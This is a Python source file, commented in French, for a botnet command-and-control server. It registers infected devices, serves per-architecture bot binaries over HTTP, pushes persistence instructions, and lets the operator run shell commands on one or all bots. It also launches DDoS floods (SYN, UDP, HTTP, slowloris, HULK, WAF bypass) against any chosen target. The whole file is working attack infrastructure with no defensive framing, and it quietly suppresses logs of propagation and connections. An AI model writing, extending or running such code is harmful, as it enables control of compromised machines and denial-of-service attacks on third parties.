#!/usr/bin/env python3
import socket
import threading
import time
import sys
import os
import http.server
import socketserver
from urllib.parse import urlparse, parse_qs

# Configuration
HOST = '0.0.0.0'  # Écoute sur toutes les interfaces
PORT = 1337       # Port d'écoute pour le C2
HTTP_PORT = 80    # Port pour servir les fichiers binaires
MAX_CONNECTIONS = 9000
BINARIES_DIR = os.path.dirname(os.path.abspath(__file__))  # Répertoire contenant les binaires
RECONNECT_INTERVAL = 60  # Intervalle de reconnexion en secondes pour les bots

# Stockage des informations sur les bots
bot_ips = set()  # Pour éviter les doublons
bot_info = {}  # Stocke les informations détaillées sur chaque bot (ID, système, uptime, etc.)
bot_persistence = {}  # Suivi de la persistance des bots
lock = threading.Lock()

# Dictionnaire des méthodes d'attaque DDoS disponibles
DDOS_METHODS = {
    # Layer 4 (Transport)
    "syn": "Flood SYN - Inonde la cible de paquets SYN sans compléter le handshake TCP",
    "ack": "Flood ACK - Envoie des paquets ACK sans connexion préalable",
    "udp": "Flood UDP - Inonde la cible de paquets UDP",
    "tcp": "Flood TCP - Établit de nombreuses connexions TCP",
    "icmp": "Flood ICMP - Envoie des paquets ICMP en masse (ping flood)",
    
    # Layer 7 (Application)
    "http": "Flood HTTP - Envoie des requêtes HTTP GET/POST en masse",
    "slowloris": "Slowloris - Garde des connexions HTTP ouvertes le plus longtemps possible",
    "rudy": "R-U-Dead-Yet - Soumet des formulaires POST très lentement",
    "arme": "ARME - Attaque par amplification de réflexion de mémoire",
    "hulk": "HULK - Génère du trafic HTTP unique pour contourner le cache",
    
    # Mixtes
    "mix": "Mix - Combinaison de plusieurs attaques simultanées",
    "bypass": "Bypass - Tente de contourner les protections WAF et anti-DDoS"
}

# Statistiques et état
total_infections = 0
total_commands = 0
active_ddos = 0
active_tasks = {}  # Suivi des tâches actives par bot

def is_duplicate_bot(ip):
    """Vérifie si un bot est déjà connecté"""
    with lock:
        return ip in bot_ips

def handle_bot(client_socket, address):
    """Gère la connexion d'un bot individuel de manière non-bloquante"""
    global total_infections, active_ddos, bot_info, bot_persistence
    
    # Vérifier si c'est un doublon
    if is_duplicate_bot(address[0]):
        # Ne pas afficher de message pour les doublons
        client_socket.close()
        return
    
    # Ajouter l'IP à l'ensemble des bots connus
    with lock:
        bot_ips.add(address[0])
    
    # Informations sur le bot
    bot_data = {
        'ip': address[0],
        'port': address[1],
        'connected_time': time.strftime('%Y-%m-%d %H:%M:%S'),
        'socket': client_socket,
        'arch': 'unknown',
        'hostname': 'unknown',
        'system_info': '',
        'device_id': '',
        'tasks': [],
        'active': True,
        'last_ping': time.time(),
        'persistence_confirmed': False,
        'reconnect_count': 0
    }
    
    # Pas de log pour les connexions - on met juste à jour le compteur en interne
    
    try:
        # Réception du message d'identification
        data = client_socket.recv(1024).decode('utf-8', errors='ignore')
        
        if data:
            # Analyser les informations du bot
            if 'BOT_CONNECTED' in data:
                total_infections += 1
                parts = data.split('|', 1)
                if len(parts) > 1:
                    bot_data['system_info'] = parts[1].strip()
                    
                    # Extraire le nom d'hôte et l'architecture si disponibles
            
            # Nouveau format d'enregistrement avec ID unique
            elif 'REGISTER' in data:
                parts = data.split(' ', 2)
                if len(parts) >= 3:
                    device_id = parts[1].strip()
                    system_info = parts[2].strip()
                    
                    bot_data['device_id'] = device_id
                    bot_data['system_info'] = system_info
                    
                    # Vérifier si c'est un bot qui se reconnecte
                    if device_id in bot_info:
                        bot_data['reconnect_count'] = bot_info[device_id]['reconnect_count'] + 1
                        print(f"\033[92m[+] Bot {device_id} reconnecté ({bot_data['reconnect_count']} fois)\033[0m")
                        
                        # Si le bot s'est reconnecté plusieurs fois, marquer la persistance comme confirmée
                        if bot_data['reconnect_count'] >= 2:
                            bot_data['persistence_confirmed'] = True
                            bot_persistence[device_id] = True
                            print(f"\033[92m[+] Persistance confirmée pour {device_id}\033[0m")
                    else:
                        # Nouveau bot
                        print(f"\033[92m[+] Nouveau bot enregistré: {device_id}\033[0m")
                        
                    # Envoyer une commande de confirmation d'enregistrement
                    client_socket.send(f"CONFIRM {device_id}".encode('utf-8'))
                    
                    # Mettre à jour les informations du bot
                    with lock:
                        bot_info[device_id] = bot_data
                    
                    if 'Hostname:' in bot_data['system_info']:
                        hostname_line = bot_data['system_info'].split('\n')[0]
                        bot_data['hostname'] = hostname_line.split('Hostname:')[1].strip()
                    
                    # Détecter l'architecture
                    if 'mips' in bot_data['system_info'].lower():
                        bot_data['arch'] = 'MIPS'
                    elif 'arm' in bot_data['system_info'].lower():
                        bot_data['arch'] = 'ARM'
                    elif 'x86_64' in bot_data['system_info'].lower():
                        bot_data['arch'] = 'x86_64'
                    elif 'x86' in bot_data['system_info'].lower():
                        bot_data['arch'] = 'x86'
                
                # Envoyer les instructions de persistance
                client_socket.send(f"PERSIST {RECONNECT_INTERVAL}".encode('utf-8'))
            
            # Envoyer un ping initial pour vérifier la connexion
            client_socket.send("PING".encode('utf-8'))
        
        # Boucle pour maintenir la connexion et recevoir d'autres messages
        while True:
            try:
                data = client_socket.recv(1024).decode('utf-8', errors='ignore')
                if not data:
                    break
                
                # Traiter les réponses du bot sans afficher de messages
                if data.startswith("SCAN_RESULT|"):
                    # Ne pas afficher les résultats de scan
                    pass
                elif data.startswith("DDOS_STARTED|"):
                    active_ddos += 1
                    parts = data.split('|')
                    # Afficher uniquement les attaques DDoS car c'est important
                    print(f"[+] Attaque DDoS démarrée contre {parts[1]} pour {parts[2]}")
                elif data.startswith("PROPAGATION|"):
                    # Ne pas afficher les logs de propagation
                    pass
                elif data == "PONG":
                    # Ping réussi, le bot est toujours actif
                    pass
                else:
                    # Ne pas afficher les autres messages
                    pass
            except Exception as e:
                # Ne pas afficher les erreurs de communication pour chaque bot
                pass
                break
    
    except Exception as e:
        # Ne pas afficher les erreurs pour chaque bot
        pass
    
    finally:
        # Marquer le bot comme inactif s'il se déconnecte
        with lock:
            # Trouver le device_id correspondant au socket
            for device_id, bot in bot_info.items():
                if bot.get('socket') == client_socket:
                    # Si le bot était en train de faire un DDoS, décrémenter le compteur
                    if any(task.startswith("DDOS") for task in bot.get('tasks', [])):
                        active_ddos -= 1
                    # Marquer comme inactif plutôt que de supprimer
                    bot['active'] = False
                    break
        
        # Ne pas afficher de message pour les déconnexions
        client_socket.close()

# Classe pour servir les fichiers binaires via HTTP
class BinaryHandler(http.server.SimpleHTTPRequestHandler):
    def __init__(self, *args, **kwargs):
        super().__init__(*args, directory=BINARIES_DIR, **kwargs)
    
    def log_message(self, format, *args):
        # Ne pas afficher les logs de téléchargement
        pass
    
    def do_GET(self):
        # Servir les fichiers binaires
        return http.server.SimpleHTTPRequestHandler.do_GET(self)

# Envoyer une commande à un bot spécifique
def send_command_to_bot(bot_index, command):
    global total_commands, active_ddos
    try:
        with lock:
            # Créer une liste temporaire des device_ids actifs
            active_device_ids = [device_id for device_id, bot_data in bot_info.items() 
                               if bot_data.get('active', True)]
            
            if bot_index < 0 or bot_index >= len(active_device_ids):
                print("[!] Index de bot invalide")
                return False
            
            device_id = active_device_ids[bot_index]
            bot = bot_info[device_id]
            
            if 'socket' not in bot or not bot['socket']:
                print(f"[!] Socket non disponible pour le bot {device_id}")
                return False
                
            bot['socket'].send(command.encode('utf-8'))
            
            # Enregistrer la commande dans l'historique du bot
            if not command == "PING":
                if 'tasks' not in bot:
                    bot['tasks'] = []
                bot['tasks'].append(command)
                total_commands += 1
            
            # Ne pas afficher de message pour chaque bot lors de l'envoi de commande
            return True
    except Exception as e:
        print(f"[!] Erreur lors de l'envoi de la commande: {str(e)}")
        return False

# Envoyer une commande à tous les bots
def broadcast_command(command):
    success_count = 0
    with lock:
        # Créer une liste temporaire des device_ids actifs
        active_device_ids = [device_id for device_id, bot_data in bot_info.items() 
                           if bot_data.get('active', True)]
        
        if not active_device_ids:
            print("[!] Aucun bot connecté")
            return 0
        
        for i in range(len(active_device_ids)):
            if send_command_to_bot(i, command):
                success_count += 1
    
    # Afficher uniquement si demandé explicitement dans la commande broadcast
    if "verbose" in command.lower():
        print(f"[+] Commande envoyée à {success_count}/{len(active_device_ids)} bots")
    
    return success_count

# Afficher la bannière du serveur C2
def print_banner():
    banner = """
    ____        _            _     ____ ____  
   | __ )  ___ | |_ _ __   ___| |_  / ___|___ \ 
   |  _ \ / _ \| __| '_ \ / _ \ __|| |     __) |
   | |_) | (_) | |_| | | |  __/ |_ | |___ / __/ 
   |____/ \___/ \__|_| |_|\___|\__(_)____|_____|  
                                                
    """
    print(banner)
    print("=== Serveur de Commande et Contrôle ===\n")

# Interface utilisateur du serveur C2
def command_interface():
    """Interface utilisateur pour contrôler les bots"""
    print_banner()
    
    while True:
        # Afficher uniquement le nombre de bots et les attaques actives - information essentielle
        active_device_ids = [device_id for device_id, bot_data in bot_info.items() 
                           if bot_data.get('active', True)]
        print(f"\n[*] {len(active_device_ids)} bots | {active_ddos} attaques DDoS actives")
        
        cmd = input("\n> ")
        cmd_parts = cmd.strip().split()
        
        if not cmd_parts:
            continue
        
        # Traiter les commandes
        if cmd_parts[0] == "bots":
            with lock:
                if not bot_info:
                    print("[*] Aucun bot connecté")
                else:
                    print("\n=== Bots connectés ===")
                    active_device_ids = [device_id for device_id, bot_data in bot_info.items() 
                                       if bot_data.get('active', True)]
                    for i, device_id in enumerate(active_device_ids):
                        bot = bot_info[device_id]
                        print(f"{i}. ID: {device_id[:10]}... | IP: {bot['ip']} | Connecté depuis: {bot['connected_time']}")
                    print(f"Total: {len(active_device_ids)}")
        
        elif cmd_parts[0] == "info" and len(cmd_parts) > 1:
            try:
                bot_index = int(cmd_parts[1])
                with lock:
                    # Créer une liste temporaire des device_ids actifs
                    active_device_ids = [device_id for device_id, bot_data in bot_info.items() 
                                       if bot_data.get('active', True)]
                    
                    if bot_index < 0 or bot_index >= len(active_device_ids):
                        print("[!] Index de bot invalide")
                    else:
                        device_id = active_device_ids[bot_index]
                        bot = bot_info[device_id]
                        print(f"\n=== Informations du bot {bot_index} ===")
                        print(f"ID unique: {device_id}")
                        print(f"IP: {bot['ip']}")
                        print(f"Architecture: {bot['arch']}")
                        print(f"Hostname: {bot['hostname']}")
                        print(f"Connecté depuis: {bot['connected_time']}")
                        print(f"Persistance confirmée: {'Oui' if bot.get('persistence_confirmed', False) else 'Non'}")
                        print(f"Reconnexions: {bot.get('reconnect_count', 0)}")
                        print(f"Informations système:\n{bot['system_info']}")
                        print(f"Tâches récentes: {', '.join(bot.get('tasks', [])[-5:]) if bot.get('tasks') else 'Aucune'}")
            except ValueError:
                print("[!] Index de bot invalide")
        
        elif cmd_parts[0] == "cmd" and len(cmd_parts) > 2:
            try:
                bot_index = int(cmd_parts[1])
                command = ' '.join(cmd_parts[2:])
                send_command_to_bot(bot_index, f"CMD {command}")
                print(f"[+] Commande envoyée au bot {bot_index}")
            except ValueError:
                print("[!] Format invalide. Utilisez: cmd <id> <commande>")
        
        elif cmd_parts[0] == "broadcast" and len(cmd_parts) > 1:
            command = ' '.join(cmd_parts[1:])
            count = broadcast_command(f"CMD {command}")
            print(f"[+] Commande envoyée à {count} bots")
        
        elif cmd_parts[0] == "ddos" and len(cmd_parts) >= 4:
            try:
                bot_index = int(cmd_parts[1])
                target = cmd_parts[2]
                duration = cmd_parts[3]
                method = cmd_parts[4] if len(cmd_parts) > 4 else "mix"
                
                if ":" not in target:
                    target = f"{target}:80"  # Port par défaut si non spécifié
                
                # Vérifier si la méthode est valide
                if method.lower() not in DDOS_METHODS:
                    print(f"[!] Méthode d'attaque inconnue: {method}")
                    print(f"Méthodes disponibles: {', '.join(DDOS_METHODS.keys())}")
                    continue
                
                # Créer une liste temporaire des device_ids actifs
                with lock:
                    active_device_ids = [device_id for device_id, bot_data in bot_info.items() 
                                       if bot_data.get('active', True)]
                    
                    if not active_device_ids:
                        print("[!] Aucun bot connecté")
                        continue
                
                # Lancer l'attaque dans un thread séparé pour ne pas bloquer l'interface
                if bot_index == -1:  # Attaque par tous les bots
                    # Créer un thread pour l'attaque DDoS
                    ddos_thread = threading.Thread(
                        target=lambda: broadcast_command(f"DDOS {target} {duration} {method}"),
                        daemon=True
                    )
                    ddos_thread.start()
                    print(f"[+] Attaque DDoS lancée contre {target} pour {duration}s en utilisant la méthode {method}")
                    active_ddos += 1
                else:
                    # Vérifier si l'index est valide
                    with lock:
                        if bot_index < 0 or bot_index >= len(active_device_ids):
                            print("[!] Index de bot invalide")
                            continue
                    
                    # Créer un thread pour l'attaque DDoS
                    ddos_thread = threading.Thread(
                        target=lambda: send_command_to_bot(bot_index, f"DDOS {target} {duration} {method}"),
                        daemon=True
                    )
                    ddos_thread.start()
                    print(f"[+] Attaque DDoS lancée contre {target} pour {duration}s en utilisant la méthode {method}")
                    active_ddos += 1
            except ValueError:
                print("[!] Format invalide. Utilisez: ddos <id> <cible> <durée> [méthode]")
                print("Pour attaquer avec tous les bots, utilisez: ddos -1 <cible> <durée> [méthode]")
        
        elif cmd_parts[0] == "ddos-all" and len(cmd_parts) >= 3:
            target = cmd_parts[1]
            duration = cmd_parts[2]
            method = cmd_parts[3] if len(cmd_parts) > 3 else "mix"
            
            if ":" not in target:
                target = f"{target}:80"  # Port par défaut si non spécifié
            
            # Vérifier si la méthode est valide
            if method.lower() not in DDOS_METHODS:
                print(f"[!] Méthode d'attaque inconnue: {method}")
                print(f"Méthodes disponibles: {', '.join(DDOS_METHODS.keys())}")
                continue
            
            # Créer une liste temporaire des device_ids actifs
            with lock:
                active_device_ids = [device_id for device_id, bot_data in bot_info.items() 
                                   if bot_data.get('active', True)]
                
                if not active_device_ids:
                    print("[!] Aucun bot connecté")
                    continue
            
            command = f"DDOS {target} {duration} {method}"
            # Lancer l'attaque dans un thread séparé pour ne pas bloquer l'interface
            threading.Thread(target=broadcast_command, args=(command,), daemon=True).start()
            print(f"[+] Attaque DDoS lancée depuis tous les bots vers {target} pour {duration}s (méthode: {method})")
            active_ddos += 1
        
        elif cmd_parts[0] == "persist":
            print("[+] Envoi des commandes de persistance à tous les bots...")
            broadcast_command(f"PERSIST {RECONNECT_INTERVAL}")
        
        elif cmd_parts[0] == "methods":
            print("\n=== Méthodes d'attaque DDoS disponibles ===")
            print("\nLayer 4 (Transport):")
            for method, desc in {k: v for k, v in DDOS_METHODS.items() if k in ["syn", "ack", "udp", "tcp", "icmp"]}.items():
                print(f"- {method}: {desc}")
            
            print("\nLayer 7 (Application):")
            for method, desc in {k: v for k, v in DDOS_METHODS.items() if k in ["http", "slowloris", "rudy", "arme", "hulk"]}.items():
                print(f"- {method}: {desc}")
            
            print("\nMixtes:")
            for method, desc in {k: v for k, v in DDOS_METHODS.items() if k in ["mix", "bypass"]}.items():
                print(f"- {method}: {desc}")
        
        elif cmd_parts[0] == "clear":
            os.system('cls' if os.name == 'nt' else 'clear')
            print_banner()
        
        elif cmd_parts[0] == "status":
            with lock:
                # Créer une liste temporaire des device_ids actifs
                active_device_ids = [device_id for device_id, bot_data in bot_info.items() 
                                   if bot_data.get('active', True)]
                
                # Compter les bots avec persistance confirmée
                persistent_bots = sum(1 for device_id, bot_data in bot_info.items() 
                                     if bot_data.get('persistence_confirmed', False))
                
                print(f"\n=== Statut du botnet ===")
                print(f"Bots connectés: {len(active_device_ids)}")
                print(f"Bots avec persistance confirmée: {persistent_bots}")
                print(f"Infections totales: {total_infections}")
                print(f"Commandes exécutées: {total_commands}")
                print(f"Attaques DDoS actives: {active_ddos}")
        
        elif cmd_parts[0] == "help" or cmd_parts[0] == "?":
            print("\n=== Commandes disponibles ===")
            print("bots - Affiche la liste des bots connectés")
            print("info <id> - Affiche les informations détaillées d'un bot")
            print("cmd <id> <commande> - Exécute une commande shell sur un bot spécifique")
            print("broadcast <commande> - Exécute une commande shell sur tous les bots")
            print("ddos <id> <cible> <durée> [méthode] - Lance une attaque DDoS depuis un bot spécifique")
            print("ddos -1 <cible> <durée> [méthode] - Lance une attaque DDoS depuis tous les bots")
            print("ddos-all <cible> <durée> [méthode] - Lance une attaque DDoS depuis tous les bots")
            print("methods - Affiche les méthodes d'attaque DDoS disponibles")
            print("persist - Envoie des commandes de persistance à tous les bots")
            print("status - Affiche le statut du botnet")
            print("clear - Efface l'écran")
            print("exit - Quitte le programme")
        
        elif cmd_parts[0] == "exit":
            print("[!] Arrêt du serveur...")
            sys.exit(0)

# Démarrer le serveur HTTP pour servir les fichiers binaires
def start_http_server():
    try:
        http_server = socketserver.ThreadingTCPServer((HOST, HTTP_PORT), BinaryHandler)
        print(f"[+] Serveur HTTP démarré sur {HOST}:{HTTP_PORT} pour servir les binaires")
        http_server.serve_forever()
    except Exception as e:
        print(f"[!] Erreur lors du démarrage du serveur HTTP: {str(e)}")
        if "Address already in use" in str(e):
            print("[!] Le port HTTP est déjà utilisé. Le serveur C2 fonctionnera sans serveur HTTP.")

# Vérifier les binaires disponibles
def check_binaries():
    binary_types = ['mips', 'arm', 'arm7', 'x86', 'x86_64', 'ppc', 'sh4', 'm68k', 'sparc']
    available_binaries = []
    missing_binaries = []
    
    for arch in binary_types:
        binary_path = os.path.join(BINARIES_DIR, f"bot.{arch}")
        if os.path.exists(binary_path):
            available_binaries.append(f"bot.{arch}")
        else:
            missing_binaries.append(f"bot.{arch}")
    
    if available_binaries:
        print("[+] Binaires disponibles:")
        for binary in available_binaries:
            print(f"    - {binary} ({os.path.getsize(os.path.join(BINARIES_DIR, binary))} octets)")
    
    if missing_binaries:
        print("[!] Binaires manquants (vous devriez les compiler):")
        for binary in missing_binaries:
            print(f"    - {binary}")

def main():
    """Fonction principale du serveur C2"""
    print("\n===== BOTNET C2 SERVER =====\n")
    print("[*] Vérification des binaires disponibles...")
    check_binaries()
    
    # Démarrer le serveur HTTP dans un thread séparé
    http_thread = threading.Thread(target=start_http_server)
    http_thread.daemon = True
    http_thread.start()
    
    # Démarrer le serveur C2
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    
    try:
        server.bind((HOST, PORT))
        server.listen(MAX_CONNECTIONS)
        print(f"[+] Serveur C2 démarré sur {HOST}:{PORT}")
        
        # Démarrer l'interface utilisateur dans un thread séparé
        ui_thread = threading.Thread(target=command_interface)
        ui_thread.daemon = True
        ui_thread.start()
        
        # Boucle principale pour accepter les connexions
        while True:
            client_socket, address = server.accept()
            client_handler = threading.Thread(target=handle_bot, args=(client_socket, address))
            client_handler.daemon = True
            client_handler.start()
    
    except KeyboardInterrupt:
        print("\n[!] Arrêt du serveur...")
    
    except Exception as e:
        print(f"[!] Erreur: {str(e)}")
    
    finally:
        # Ferme toutes les connexions
        with lock:
            for device_id, bot in bot_info.items():
                if 'socket' in bot and bot['socket']:
                    try:
                        bot['socket'].close()
                    except:
                        pass
        
        server.close()

if __name__ == "__main__":
    main()
